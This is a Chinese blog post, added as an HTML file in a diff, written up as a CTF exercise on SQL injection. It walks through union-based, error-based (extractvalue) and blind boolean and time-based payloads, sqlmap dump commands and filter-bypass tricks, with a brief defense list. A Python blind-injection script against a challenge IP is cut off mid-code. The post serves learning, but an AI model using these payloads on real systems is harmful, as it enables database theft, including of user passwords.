@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="每天一道CTF，日积月累，期待进步！ SQL注入攻击，union联合查询和 SQLMAP；SQL盲注">
+<meta property="og:type" content="article">
+<meta property="og:title" content="每日一题1-18">
+<meta property="og:url" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/index.html">
+<meta property="og:site_name" content="L1E6N0A2">
+<meta property="og:description" content="每天一道CTF，日积月累，期待进步！ SQL注入攻击，union联合查询和 SQLMAP；SQL盲注">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a1.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog/blog/source_posts/每日一题1-18/a1.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a2.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog/blog/source_posts/每日一题1-18/a2.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a3.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog/blog/source_posts/每日一题1-18/a3.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a4.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog/blog/source_posts/每日一题1-18/a4.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a5.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog/blog/source_posts/每日一题1-18/a5.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a6.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog/blog/source_posts/每日一题1-18/a6.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a7.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog/blog/source_posts/每日一题1-18/a7.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a8.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog/blog/source_posts/每日一题1-18/a8.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a9.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog/blog/source_posts/每日一题1-18/a9.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a10.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog/blog/source_posts/每日一题1-18/a10.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a11.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog/blog/source_posts/每日一题1-18/a11.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a12.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog/blog/source_posts/每日一题1-18/a12.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a13.png">
+<meta property="og:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog/blog/source_posts/每日一题1-18/a13.png">
+<meta property="article:published_time" content="2021-01-18T02:33:11.000Z">
+<meta property="article:modified_time" content="2021-03-19T07:21:50.696Z">
+<meta property="article:author" content="lyj789">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a1.png">
+
+<link rel="canonical" href="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>每日一题1-18 | L1E6N0A2</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">L1E6N0A2</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">监督自己不断学习</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lyj789">
+      <meta itemprop="description" content="快乐打工人">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L1E6N0A2">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          每日一题1-18
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-18 10:33:11" itemprop="dateCreated datePublished" datetime="2021-01-18T10:33:11+08:00">2021-01-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-19 15:21:50" itemprop="dateModified" datetime="2021-03-19T15:21:50+08:00">2021-03-19</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>每天一道CTF，日积月累，期待进步！</p>
+<p>SQL注入攻击，union联合查询和 SQLMAP；SQL盲注</p>
+<a id="more"></a>
+
+<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>看到题目是一个典型的SQL注入，有回显</p>
+<img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a1.png" class title="a1">
+
+<p><img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog\blog\source_posts\每日一题1-18\a1.png" alt="1"></p>
+<p>post方式传递数据，在id变量处可能存在注入点，下面尝试注入</p>
+<img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a2.png" class title="a2">
+
+<p><img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog\blog\source_posts\每日一题1-18\a2.png" alt="2"></p>
+<p>有两种方法，SQLMAP或利用union查询</p>
+<h5 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h5><ol>
+<li><p>确定注入点<br> 如果<code>id=1&#39; and 1=1#</code>返回正常，1=2返回失败，则存在字符型注入 </p>
+</li>
+<li><p>判断字段数：<br> <code>id=1&#39; order by 4#</code> 4列 （&lt;=4都正常回显，&gt;4无输出）</p>
+</li>
+<li><p>判断回显位：<br> <code>id=0&#39; union select 1,2,3,4#</code>2，3，4列是回显列 ，第一列是id</p>
+<img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a3.png" class title="a3">
+
+<p><img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog\blog\source_posts\每日一题1-18\a3.png" alt="3"></p>
+</li>
+<li><p>查询表名：<br> <code>id=0&#39; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</code>表 fl4g,sc </p>
+<img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a4.png" class title="a4">
+
+<p><img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog\blog\source_posts\每日一题1-18\a4.png" alt="4"></p>
+</li>
+<li><p>查fl4g的字段：<br> <code>id=0&#39; union select 1,2,3,group_concat(column_name) from  information_schema.columns where table_schema=database() and  table_name=&#39;fl4g&#39;#</code>(有些情况可以用十六进制绕过)字段名skctf_flag </p>
+<img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a5.png" class title="a5">
+
+<p><img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog\blog\source_posts\每日一题1-18\a5.png" alt="5"></p>
+</li>
+<li><p>列出数据：<br> <code>id=0&#39; union select 1,2,3,skctf_flag from fl4g#</code>得到flag</p>
+<img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a6.png" class title="a6">
+
+<p><img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog\blog\source_posts\每日一题1-18\a6.png" alt="6"></p>
+</li>
+</ol>
+<h5 id="SQLMAP的POST注入"><a href="#SQLMAP的POST注入" class="headerlink" title="SQLMAP的POST注入"></a>SQLMAP的POST注入</h5><ol>
+<li><p>burp截包，输入1，提交。burp已经把id获取到了，保存为<strong>txt</strong>文件。放置到sqlmap的目录下边。</p>
+<img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a7.png" class title="a7">
+
+</li>
+</ol>
+<p><img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog\blog\source_posts\每日一题1-18\a7.png" alt="7"></p>
+<ol start="2">
+<li><p>sqlmap对站点进行分析（-r）</p>
+<img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a8.png" class title="a8">
+
+</li>
+</ol>
+<p><img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog\blog\source_posts\每日一题1-18\a8.png" alt="8"></p>
+<ol start="3">
+<li><p>开始注入</p>
+<ul>
+<li><p>–dbs数据库  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r D:\CTF\SQLmap\1.txt （-p admin_name注入点）--dbs</span><br><span class="line">不带注入点的话，sqlmap会自动检测</span><br></pre></td></tr></table></figure>
+
+ <img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a9.png" class title="a9">
+
+<p>  <img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog\blog\source_posts\每日一题1-18\a9.png" alt="9"></p>
+</li>
+<li><p>-D skctf –tables 表</p>
+</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r D:\CTF\SQLmap\1.txt -D skctf --tables</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a10.png" class title="a10">
+
+<p><img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog\blog\source_posts\每日一题1-18\a10.png" alt="10"></p>
+<ul>
+<li><p>-D skctf  -T fl4g –columns 列</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r D:\CTF\SQLmap\1.txt -D skctf -T fl4g --columns</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a11.png" class title="a11">
+
+<p><img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog\blog\source_posts\每日一题1-18\a11.png" alt="11"></p>
+</li>
+<li><p>-D skctf  -T fl4g  -C “skctf_flag” –dump 值</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r D:\CTF\SQLmap\1.txt -D skctf -T fl4g  -C &quot;skctf_flag&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a12.png" class title="a12">
+
+<p>   <img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog\blog\source_posts\每日一题1-18\a12.png" alt="12"></p>
+</li>
+</ul>
+<p>get方式注入就是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;index.php?id&#x3D;1&quot; --dbs</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>mysql中的注释常用两种方式–+与#，#在url中需要编码为%23以避免与url本身的锚点冲突。</p>
+<h5 id="MYSQL基于联合查询-报错的手工注入"><a href="#MYSQL基于联合查询-报错的手工注入" class="headerlink" title="MYSQL基于联合查询/报错的手工注入"></a>MYSQL基于联合查询/报错的手工注入</h5><ul>
+<li>union联合查询注入 针对字符型（上面的例子）</li>
+<li>报错注入 针对数字型（没单引号）<ul>
+<li>通过floor报错</li>
+<li>通过updatexml报错</li>
+<li>通过ExtractValue报错</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())))&#x3D;1 --+</span><br></pre></td></tr></table></figure>
+
+<p><code>extractvalue(XML,XPath)</code>从目标XML中返回包含查询值得字符串</p>
+<p>参数XML：String格式，为XML文档对象得名称</p>
+<p>参数XPath：xpath格式得字符串</p>
+<p>因为我们在xpath输入的不是要求的xpath格式的字符串，所以函数会报错返回xpath参数内容</p>
+<p>xpath会被带入mysql进行执行操作，发现不是xpath格式，但是只有在执行后才会发现，就会执行sql代码（select开始），查询内容并且concat拼接字符串，随后由extractvalue函数返回报错</p>
+<img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/a13.png" class title="a13">
+
+<p><img src="/2021/01/18/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%981-18/Blog\blog\source_posts\每日一题1-18\a13.png" alt="13"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)))&#x3D;1 --+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x7e,(select group_concat(username,0x7e,password) from users)))&#x3D;1 --+</span><br></pre></td></tr></table></figure>
+
+<h5 id="MYSQL盲注"><a href="#MYSQL盲注" class="headerlink" title="MYSQL盲注"></a>MYSQL盲注</h5><p>盲注入不会展现任何数据库报错内容，它是依据构造真或假的问题对数据库进行“提问”，只有错误或正确的显示，不会把整个数据库的内容显示出来。</p>
+<ul>
+<li><p>基于bool的盲注</p>
+<p>牢记布尔盲注的特点：<strong>只有当<code>and</code>后面的sql语句为True</strong>才不会报错；报错就表示and后的sql语句不成立。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select table_name from information_schema.tables where tables_schema&#x3D;database() limit 0,1),1,1))&#x3D;101 #</span><br></pre></td></tr></table></figure>
+
+<p><code>substr(a,b,c)</code> 将a结果从b开始截取c长度字符，ascii()将字符转为ascii值</p>
+</li>
+<li><p>基于时间的盲注</p>
+<p>利用sleep()或benchmark()等函数让mysql执行时间变长经常与if(expr1,expr2,expr3)语句结合使用，通过页面的响应时间来判断条件是否正确。if(expr1,expr2,expr3)含义是如果expr1是True,则返回expr2,否则返回expr3。</p>
+<ol>
+<li><p>判断当前数据库库名的长度</p>
+<p>如果数据库库名长度大于等于8，则mysql查询休眠5秒，否则查询1。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(length(database())&gt;&#x3D;8,sleep(5),1)</span><br><span class="line">http:&#x2F;&#x2F;...&#x2F;php?id&#x3D;1&#39; and if(length(database())&gt;&#x3D;8,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>大于等于8，休眠，大于等于9不休眠，说明长度为8</p>
+</li>
+<li><p>获取当前数据库库名</p>
+<p>由于数据库的库名范围一般在a-z,0-9之间，可能有特殊字符，不区分大小写。和boolean注入类似，使用substr函数来截取database()的值，一次截取一个，注意是从1开始。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(substr(database(),1,1)&#x3D;&#39;a&#39;,sleep(5),1)</span><br><span class="line">http:&#x2F;&#x2F;...&#x2F;1.php?id&#x3D;1&#39;and if(substr(database(),1,1)&#x3D;&#39;a&#39;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>使用使用Burp爆破：得到数据库名：security</p>
+</li>
+<li><p>获取数据库表名</p>
+<p>LIMIT[位置偏移量,]行数</p>
+<p>其中，中括号里面的参数是可选参数，位置偏移量是指MySQL查询分析器要从哪一行开始显示，索引值从0开始，即第一条记录位置偏移量是0，第二条记录的位置偏移量是1,依此类推…，第二个参数为“行数”即指示返回的记录条数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1)&#x3D;&#39;a&#39;,sleep(5),1)</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;...&#x2F;php?id&#x3D;1&#39; and if(substr((select table_name from information_schema.tables where  table_schema&#x3D;&#39;security&#39; limit 0,1),1,1)&#x3D;&#39;a&#39;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>使用使用Burp爆破：得到数据库表名：security</p>
+<p>修改limit 0,1为limit 1,1，可以得到第二个表名。最后得到所有表名：</p>
+<p>第1个表名是：emails</p>
+<p>第2个表名是：referers （limit 2，1）</p>
+<p>第3个表名是：uagents （limit 3，1）</p>
+<p>第4个表名是：users （limit 4，1）</p>
+<p>依次类推，就可以得到完整的数据库库名，表名，字段名和具体数据。</p>
+</li>
+</ol>
+</li>
+</ul>
+<h5 id="SQL注入的防御"><a href="#SQL注入的防御" class="headerlink" title="SQL注入的防御"></a>SQL注入的防御</h5><ul>
+<li>过滤敏感字符</li>
+</ul>
+<p>将常用的SQL注入字符写入到黑名单中，然后通过程序对用户提交的POST、GET请求以及请求中的各个字段都进行过滤检查，筛选威胁字符。</p>
+<p>通常过滤空格、括号、引号……等特殊字符，但是这些可以绕过的。</p>
+<p>举例：过滤空格 <code>select/**/name/**/from/**/user/**/where/**/id=&#39;kk&#39; 或 select(name)from(user)where(id=&#39;kk&#39;)</code>通过这种方法就会规避对空格的过滤；过滤括号和引号<code>select name from user wehere id=0x6b6b</code>0x6b6b(kk的十六进制)</p>
+<ul>
+<li>限制查询长度</li>
+</ul>
+<p>由于SQL注入过程中需要构造较长的SQL语句，因此，一些特定的程序可以使用限制用户提交的请求内容的长度来达到防御SQL注入的目的，但这种效果并不好。</p>
+<ul>
+<li>设置数据库权限</li>
+</ul>
+<p>根据程序要求为特定的表设置特定的权限，如：某段程序对某表只需具备select权限即可，这样即使程序存在问题，恶意用户也无法对表进行update或insert等写入操作。</p>
+<ul>
+<li>限制目录权限</li>
+</ul>
+<p>WEB目录应至少遵循“可写目录不可执行，可执行目录不可写”的原则，在次基础上，对各目录进行必要的权限细化。</p>
+<ul>
+<li>限制数据类型</li>
+</ul>
+<p>因为PHP语言没有严格的限制数据类型的定义例如：“ID=1 就默认ID为Intger ； name=kk 默认name为string”在PHP的弱类型管理中这是不安全的。</p>
+<h4 id="补充：SQLbool盲注脚本"><a href="#补充：SQLbool盲注脚本" class="headerlink" title="补充：SQLbool盲注脚本"></a>补充：SQLbool盲注脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">s.keep_alive = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://23.236.125.55:1000/34fb69d7b4467e33c71b0153e62f7e2b/&#x27;</span></span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://23.236.125.55:1000/34fb69d7b4467e33c71b0153e62f7e2b/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">127</span>):</span><br><span class="line">        postdata = &#123;</span><br><span class="line">            <span class="string">&#x27;uname&#x27;</span>:<span class="string">&quot;&#x27;||length(pwd)=&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;||&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;pwd&#x27;</span>:<span class="string">&#x27;123&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span> i,postdata</span><br><span class="line">        r = s.post(url=url,headers=header,data=postdata)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;get length!&quot;</span></span><br><span class="line">            <span class="keyword">return</span> </span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">get_pwd_char</span>():</span></span><br><span class="line">            pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">30</span>):</span><br><span 